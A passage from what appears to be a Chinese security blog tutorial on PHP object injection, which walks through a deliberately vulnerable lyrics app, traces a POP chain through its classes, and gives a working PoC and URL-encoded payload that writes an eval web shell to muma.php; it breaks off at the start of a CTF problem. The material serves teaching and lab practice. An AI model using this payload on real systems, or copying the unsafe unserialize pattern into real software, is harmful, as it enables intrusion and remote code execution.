class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">"E:\\www\\pop\\"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logger;</span><br><span class="line">  <span class="keyword">protected</span> $name;</span><br><span class="line">  <span class="keyword">protected</span> $group;</span><br><span class="line">  <span class="keyword">protected</span> $url;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $group, $url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="keyword">new</span> OutputFilter(<span class="string">"/\[i\](.*)\[\/i\]/i"</span>, <span class="string">"&lt;i&gt;\\1&lt;/i&gt;"</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger(<span class="keyword">new</span> LogWriter_File(<span class="string">"song_views"</span>, <span class="keyword">new</span> LogFileFormat(<span class="keyword">array</span>($fltr), <span class="string">"\n"</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url . <span class="string">"'&gt;&lt;i&gt;"</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"&lt;/i&gt;&lt;/a&gt; by "</span> . <span class="keyword">$this</span>-&gt;group;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="keyword">protected</span> $song;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;&lt;a href='song.php?name="</span> . urlencode(<span class="keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="string">"'&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;get_name() . <span class="string">"&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $oldlyrics = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Porter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(serialize($lyrics));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">importData</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(base64_decode($lyrics));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $conn;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($dbuser, $dbpass, $db)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = mysqli_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass, $db);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $r = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span><br><span class="line">      $s = intval($lyric);</span><br><span class="line">      $result = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT data FROM lyrics WHERE id=$s"</span>);</span><br><span class="line">      <span class="keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="keyword">NULL</span>) &#123;</span><br><span class="line">        $r []= unserialize(base64_decode($row[<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $ids = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"INSERT INTO lyrics (data) VALUES (\""</span> . base64_encode(serialize($lyric)) . <span class="string">"\")"</span>);</span><br><span class="line">      $res = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT MAX(id) FROM lyrics"</span>);</span><br><span class="line">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> var_dump($ids);</span><br><span class="line">    <span class="keyword">return</span> $ids; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = <span class="keyword">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  unserialize($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pop链构造分析"><a href="#pop链构造分析" class="headerlink" title="pop链构造分析"></a>pop链构造分析</h3><p>分析一下，我们是需要构造pop链触发反序列化漏洞，那就先寻找存在unserialize()函数调用的地方，发现定义的类方法中有3处存在调用unserialize()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $oldlyrics = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $r = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span><br><span class="line">      $s = intval($lyric);</span><br><span class="line">      $result = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT data FROM lyrics WHERE id=$s"</span>);</span><br><span class="line">      <span class="keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="keyword">NULL</span>) &#123;</span><br><span class="line">        $r []= unserialize(base64_decode($row[<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中Conn类中调用的unserialize()函数的参数是通过执行SQL查询获取的，无法直接控制；而User类中两个unserialize()函数的参数都是通过cookie传入的，外部可控，那么切入点就在这里了。</p><p>既然知道了哪些类方法的unserialize()函数可控，那就找下可利用的魔法函数有哪些了。浏览了一遍方法，除去构造方法__construct()后，发现有个析构函数__destruct()中调用了该类成员变量的log()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="keyword">protected</span> $song;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看到song变量可以通过构造方法直接赋值。那么接下来看看哪些类含有log()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;<span class="comment">//</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;<span class="comment">//</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>发现Logger类和Song类中都有log()方法，看明显看出Logger类的log()方法疑似可利用，因为其中调用了该类logwriter成员变量的writeLog()方法。</p><p>下面找下writeLog()方法，发现只有LogWriter_File类中定义了，并且其功能是想指定Web目录路径上写文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">"E:\\www\\pop\\"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意一点就是，这里调用了format()方法对参数进行格式化处理，format()方法的定义在LogFileFormat类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filters;</span><br><span class="line">  <span class="keyword">protected</span> $endl;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="keyword">return</span> $txt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中又调用了filter()方法过滤内容，然后调用str_replace()方法将换行符替换成endl成员变量的值。</p><p>filter()方法是定义在OutputFilter类中，作用是使用成员变量matchPattern的值作为pattern进行正则匹配过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="keyword">protected</span> $replacement;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看到这里，调用了preg_replace()，当PHP版本不高于5.5时可以用正则的/e模式来执行php代码。</p><p>最后借lemon大佬个图理一下呗：</p><p><img src="/2019/05/04/PHP对象注入之pop链构造/5.png" alt=""></p><p>触发点1即写shell文件，触发点2即preg_replace()代码注入但限制PHP版本&lt;=5.5。</p><h3 id="PoC编写"><a href="#PoC编写" class="headerlink" title="PoC编写"></a>PoC编写</h3><p>由于本地环境的PHP是5.6，就构造第一个触发点的PoC吧。</p><p>poc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="keyword">protected</span> $replacement;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filters;</span><br><span class="line">  <span class="keyword">protected</span> $endl;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="keyword">protected</span> $song;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="keyword">new</span> OutputFilter(<span class="string">"//"</span>, <span class="string">"&lt;?php @eval(\$_GET['cmd']);?&gt;"</span>));</span><br><span class="line">$obj1 = <span class="keyword">new</span> LogFileFormat($arr, <span class="string">'\n'</span>);</span><br><span class="line">$obj2 = <span class="keyword">new</span> LogWriter_File(<span class="string">"muma.php"</span>, $obj1);</span><br><span class="line">$obj3 = <span class="keyword">new</span> Logger($obj2);</span><br><span class="line">$obj = <span class="keyword">new</span> Lyrics(<span class="string">"666"</span>, $obj3);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问得到poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22666%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22muma.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A28%3A%22%3C%3Fphp+%40eval%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p>将该poc填入参数中访问：</p><p><img src="/2019/05/04/PHP对象注入之pop链构造/3.png" alt=""></p><p>弹出警告和注意信息。再尝试访问下我们的后门文件，已经存在了：</p><p><img src="/2019/05/04/PHP对象注入之pop链构造/4.png" alt=""></p><h2 id="0x03-一道CTF题目"><a href="#0x03-一道CTF题目" class="headerlink" title="0x03 一道CTF题目"></a>0x03 一道CTF题目</h2><p>访问页面，看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 